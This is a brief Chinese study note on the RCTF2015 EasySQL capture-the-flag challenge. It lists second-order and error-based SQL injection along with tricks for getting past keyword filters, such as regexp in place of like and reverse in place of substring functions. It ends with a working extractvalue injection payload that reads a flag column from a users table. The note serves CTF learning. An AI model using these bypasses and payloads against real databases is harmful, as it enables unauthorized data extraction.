# WP
[[RCTF2015]EasySQL_[rctf2015]easysql 1_penson by 小乌的博客-CSDN博客](https://blog.csdn.net/SopRomeo/article/details/107324563)
# 知识点
### 二次注入
### 报错注入
### 一些字符的绕过
#### `and`等连接符以及` `被过滤,
:::info
用`||``&&``^`替代
:::
#### `like`被过滤，`left``right``mid``substr`等字符串分割被过滤
:::info
用`regexp`替代`like`<br />用`reverse`替代字符串分割函数
:::

```sql
(extractvalue(1,concat(0x7e,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp('^f')))))
```
